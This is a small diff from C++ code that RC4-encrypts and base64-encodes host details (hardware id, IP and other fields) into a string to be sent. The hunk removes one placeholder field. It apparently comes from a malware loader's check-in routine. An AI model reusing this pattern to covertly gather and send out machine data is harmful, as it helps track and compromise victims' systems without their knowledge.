@@ -37,7 +37,6 @@ namespace absent
 				{"hw", absent::crypto::b64::encode(rc4.crypt(info["hw"], key).c_str())},
 				{"bu", absent::crypto::b64::encode(rc4.crypt(info["bu"], key).c_str())},
 				{"ip", absent::crypto::b64::encode(rc4.crypt(info["ip"], key).c_str())},
-				{"ct", absent::crypto::b64::encode(rc4.crypt("N/A", key).c_str())},		//UPDATE
 				{"pr", absent::crypto::b64::encode(rc4.crypt(info["pr"], key).c_str())}
 			};
 			std::string toSend = absent::crypto::b64::encode(smallInfo.dump().c_str());
